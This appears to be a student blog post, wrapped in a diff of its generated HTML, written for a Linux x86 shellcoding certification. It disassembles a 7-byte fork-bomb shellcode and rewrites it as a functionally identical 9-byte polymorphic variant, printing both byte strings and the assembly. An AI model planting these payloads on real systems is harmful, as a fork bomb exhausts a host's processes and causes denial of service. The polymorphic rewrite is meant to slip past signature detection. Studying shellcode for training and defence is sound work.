@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ff3500eed5a75a68d749d7b17422f0859d1af87a">
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Polymorphic conversion of three payloads - part 2 | SLAE-x86</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Polymorphic conversion of three payloads - part 2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="x86 Assembly Language and Shellcoding on Linux" />
+<meta property="og:description" content="x86 Assembly Language and Shellcoding on Linux" />
+<link rel="canonical" href="http://localhost:4000/05_polymorphic_shellcode/payload_2/" />
+<meta property="og:url" content="http://localhost:4000/05_polymorphic_shellcode/payload_2/" />
+<meta property="og:site_name" content="SLAE-x86" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/05_polymorphic_shellcode/payload_2/","headline":"Polymorphic conversion of three payloads - part 2","description":"x86 Assembly Language and Shellcoding on Linux","@type":"WebPage","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>SLAE-x86</h1>
+        <h2>x86 Assembly Language and Shellcoding on Linux</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/parzio/SLAE-x86" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="polymorphic-conversion-of-three-payloads---part-2">Polymorphic conversion of three payloads - part 2</h1>
+
+<h2 id="forkbomb">Forkbomb</h2>
+
+<p>The shellcode chosen for this assignment comes from Shellstorm (Linux/x86 - forkbomb) and is located at
+<a href="http://shell-storm.org/shellcode/files/shellcode-214.php">http://shell-storm.org/shellcode/files/shellcode-214.php</a>.</p>
+
+<p>This shellcode claims to perform a fork bomb causing a denial of service on the host machine and has a length of <strong>7 bytes</strong>. Let’s take the shellcode and decompile it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; echo -ne "\x6a\x02\x58\xcd\x80\xeb\xf9" | ndisasm -b32 -
+
+00000000  6A02              push byte +0x2
+00000002  58                pop eax
+00000003  CD80              int 0x80
+00000005  EBF9              jmp short 0x0
+</code></pre></div></div>
+
+<p>The shellcode executes an infinite loop and call the fork syscall.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; man 2 fork
+create a child process
+pid_t fork(void);
+</code></pre></div></div>
+
+<p>Let’s try to modify the syntax of the code without affecting the semantic.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; compile with:
+; 	nasm -f elf32 shellcode-214-poly.asm
+;	ld -o shellcode-214-poly shellcode-214-poly.o
+; extract shellcode with:
+; 	objdump -d shellcode-214-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+
+global _start
+section .text
+	_start:
+		mov al,0x2  ; move the syscall number of fork in al
+		and eax,0xf ; mask eax to ensure that the final value of eax is 0x2
+		int 0x80    ; interrupt for calling fork syscall
+		jmp _start  ; infinite loop
+</code></pre></div></div>
+
+<p>The resulting shellcode does not contains null bytes and is different from the initial one, however semantically the two shellcodes are identical. This new shellcode is <em>9 bytes</em> long.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\xb0\x02\x83\xe0\x0f\xcd\x80\xeb\xf7
+</code></pre></div></div>
+
+<p>Great! Analysis completed.</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</em></p>
+
+<p><a href="http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert">http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert</a></p>
+
+<p><em>Student-ID: PA-8733</em></p>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
